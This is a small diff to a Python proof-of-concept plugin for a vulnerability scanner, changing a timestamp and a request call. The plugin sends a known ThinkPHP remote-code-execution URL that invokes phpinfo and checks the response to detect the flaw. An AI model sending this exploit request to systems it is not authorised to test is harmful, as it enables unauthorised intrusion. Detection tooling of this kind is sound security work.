@@ -3,7 +3,7 @@
 '''
 Date: 2022-03-21 16:15:34
 LastEditors: recar
-LastEditTime: 2022-03-23 18:15:24
+LastEditTime: 2022-03-24 11:48:08
 '''
 from plugins.poc.base import PocBase
 
@@ -21,7 +21,7 @@ class Poc(PocBase):
         url_path = r"/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1"
         # 这里需要返回 response
         url = f"{self.base_url}{url_path}"
-        response =  self.get(url, timeout=3)        
+        response =  self.request(url)        
         if "<title>phpinfo()</title>" in response.text:
             return True, url
         return False, None
